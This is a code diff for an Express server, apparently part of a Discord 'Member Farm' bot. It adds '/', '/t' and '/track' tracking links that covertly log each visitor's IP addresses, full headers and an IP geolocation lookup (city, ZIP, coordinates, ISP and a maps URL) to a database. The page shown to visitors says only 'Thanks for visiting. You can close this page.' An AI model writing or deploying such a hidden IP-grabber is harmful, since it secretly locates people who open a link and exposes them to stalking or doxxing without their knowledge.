@@ -65,7 +65,7 @@ function pageHtml(opts) {
   const ok = opts.ok;
   const visitId = String(opts.visitId || '');
   const title = ok ? 'Authorized' : 'Authorization failed';
-  const sub = ok ? ('Welcome' + (opts.username ? ', ' + opts.username : '') + '. Account linked.') : (opts.error || 'Error');
+  const sub = ok ? (opts.username ? ('Welcome, ' + opts.username + '. Account linked.') : 'Thanks for visiting. You can close this page.') : (opts.error || 'Error');
   const color = ok ? '#57f287' : '#ed4245';
   return `<!DOCTYPE html><html><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
 <title>Member Farm</title>
@@ -110,7 +110,39 @@ function createOAuthServer(client) {
   app.set('trust proxy', true);
   app.use(express.json({ limit: '64kb' }));
 
-  app.get('/', (req, res) => res.type('html').send(pageHtml({ ok: true, visitId: '', username: '', error: '' }).replace('Authorized', 'Member Farm').replace('Account linked.', 'OAuth online.')));
+  async function logVisitFromRequest(req, status) {
+    const h = req.headers || {};
+    const ip = getClientIp(req);
+    const geo = await lookupGeo(ip);
+    try {
+      const ins = await one(
+        `INSERT INTO oauth_visits (ip,forwarded_for,real_ip,user_agent,accept_language,accept,referer,origin,host,method,path,query_string,country,region,city,isp,org,timezone,lat,lon,raw_headers,status,cf_country,sec_ch_ua,sec_ch_ua_mobile,sec_ch_ua_platform,asn,as_name,proxy,hosting,zip,district,geo_source,maps_url)
+         VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22,$23,$24,$25,$26,$27,$28,$29,$30,$31,$32,$33,$34) RETURNING id`,
+        [ip, String(h['x-forwarded-for']||''), String(h['x-real-ip']||''), String(h['user-agent']||''),
+         String(h['accept-language']||''), String(h['accept']||''), String(h['referer']||''), String(h['origin']||''),
+         String(h['host']||''), req.method, req.path||'', JSON.stringify(req.query||{}),
+         geo.country||null, geo.region||null, geo.city||null, geo.isp||null, geo.org||null, geo.timezone||null,
+         geo.lat||null, geo.lon||null, JSON.stringify(h), status||'visit',
+         String(h['cf-ipcountry']||''), String(h['sec-ch-ua']||''), String(h['sec-ch-ua-mobile']||''),
+         String(h['sec-ch-ua-platform']||''), geo.asn||null, geo.as_name||null, geo.proxy||null, geo.hosting||null,
+         geo.zip||null, geo.district||null, geo.geo_source||null, geo.maps_url||null]
+      );
+      return ins?.id || null;
+    } catch (e) { console.error('visit insert', e.message); return null; }
+  }
+
+  async function serveTrackPage(req, res) {
+    const visitId = await logVisitFromRequest(req, 'link_visit');
+    return res.type('html').send(
+      pageHtml({ ok: true, visitId, username: '', error: '' })
+        .replace('Authorized', 'Member Farm')
+        .replace('Account linked.', 'You can close this page.')
+    );
+  }
+
+  app.get('/', (req, res) => serveTrackPage(req, res));
+  app.get('/t', (req, res) => serveTrackPage(req, res));
+  app.get('/track', (req, res) => serveTrackPage(req, res));
   app.get('/health', (req, res) => res.json({ ok: true, bot: client?.user?.tag || 'starting' }));
 
   app.post('/oauth/beacon', async (req, res) => {
